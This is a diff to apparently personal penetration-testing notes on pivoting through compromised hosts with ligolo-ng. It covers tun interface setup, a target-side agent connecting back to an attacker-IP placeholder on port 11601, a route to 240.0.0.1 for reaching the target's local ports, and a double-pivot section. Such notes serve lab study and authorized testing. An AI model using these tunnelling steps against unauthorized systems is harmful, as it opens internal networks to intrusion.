@@ -20,6 +20,8 @@ In this one, for double pivot, first session is closed and new direct link is ma
 Add 240.0.0.1 to ip route instead of target IP, all ports will be forwarded to this IP eg. 240.0.0.1:8080 will show the website hosted on target which wasn't accessible earlier
 {% endembed %}
 
+{% embed url="https://www.linkedin.com/pulse/bidirectional-port-forwarding-ligolo-ng-saathwick-venkataramalingam-grwuc" %}
+
 ```
 Wreath -> invoke-portscan.ps1 comms mentioned too (instead of nmap)
 ```
@@ -29,11 +31,11 @@ Wreath -> invoke-portscan.ps1 comms mentioned too (instead of nmap)
 ```
 sudo ip tuntap add user [your_username] mode tun ligolo
 sudo ip link set ligolo up
-ligolo -selfcert -laddr 0.0.0.0:443 
+ligolo -selfcert 
 #Accepts connections at port 443
 
 TARGET
-.\agent.exe -connect <attacker IP here>:443 -retry -ignore-cert
+.\agent.exe -connect <attacker IP here>:11601 -retry -ignore-cert
 
 KALI
 session
@@ -47,7 +49,15 @@ BACK TO LIGOLO
 start
 ```
 
+To perform port forwarding, before start
+
+```
+sudo ip route add 240.0.0.1/32 dev ligolo
+```
+
 #### Double Pivot
+
+New interface `ligolo-double` now
 
 ```
 EXISTING SESSION
